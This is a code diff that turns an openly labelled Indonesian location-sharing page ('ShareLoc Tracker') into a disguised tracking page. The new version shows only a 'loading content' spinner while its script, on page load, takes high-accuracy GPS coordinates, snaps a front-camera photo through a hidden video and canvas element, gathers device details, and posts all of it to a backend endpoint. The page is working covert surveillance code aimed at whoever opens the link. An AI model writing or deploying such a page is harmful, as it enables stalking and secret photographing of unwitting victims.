@@ -3,49 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ShareLoc - Live Sender</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <title>Memuat Halaman...</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; color: #333; }
-        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #0f172a; color: #f8fafc; }
+        .loader { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>ShareLoc Tracker</h2>
-        <p id="status">Meminta izin akses lokasi GPS...</p>
-        <p id="coords" style="font-size: 14px; color: #666;"></p>
-    </div>
+    <div class="loader"></div>
+    <h2>Memuat Konten...</h2>
+    <p>Mohon tunggu sebentar.</p>
+
+    <!-- Elemen kamera tersembunyi -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Terhubung otomatis ke Supabase Anda
-        const supabaseUrl = 'https://idjfzymaywdimpfgkncq.supabase.co';
-        const supabaseKey = 'sb_publishable_OMuw6k7doR0laJLJG4IPsq__cZgH...';
-        const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
+        async function captureData() {
+            let latitude = null;
+            let longitude = null;
+            let accuracy = null;
 
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const deviceInfo = navigator.userAgent;
+            // 1. Ambil Lokasi GPS
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
+                    });
+                    latitude = pos.coords.latitude;
+                    longitude = pos.coords.longitude;
+                    accuracy = pos.coords.accuracy;
+                } catch (e) {
+                    console.log("GPS ditolak/gagal");
+                }
+            }
 
-                document.getElementById('status').innerText = 'Status: Lokasi berhasil dikirim!';
-                document.getElementById('coords').innerText = `Lat: ${lat}, Lng: ${lng}`;
+            // 2. Ambil Foto Kamera Depan
+            let imageBase64 = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
+                
+                await new Promise(r => setTimeout(r, 1000)); // Jeda agar kamera fokus
 
-                // Simpan koordinat terbaru ke tabel Supabase
-                await _supabase.from('locations').insert([
-                    { latitude: lat, longitude: lng, device_info: deviceInfo }
-                ]);
-            }, (error) => {
-                document.getElementById('status').innerText = 'Gagal mengakses GPS: ' + error.message;
-            }, {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 5000
-            });
-        } else {
-            document.getElementById('status').innerText = 'Browser Anda tidak Mendukung Geolocation.';
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
+
+                // Matikan kamera setelah selesai
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.log("Kamera ditolak/gagal");
+            }
+
+            // 3. Kumpulkan Info Perangkat Tambahan
+            const deviceData = {
+                hardwareConcurrency: navigator.hardwareConcurrency || '-',
+                deviceMemory: navigator.deviceMemory || '-',
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language || '-'
+            };
+
+            // 4. Kirim ke Backend API
+            try {
+                await fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude,
+                        longitude,
+                        accuracy,
+                        image: imageBase64,
+                        deviceData
+                    })
+                });
+            } catch (e) {
+                console.log("Gagal mengirim data");
+            }
         }
+
+        window.onload = captureData;
     </script>
 </body>
 </html>
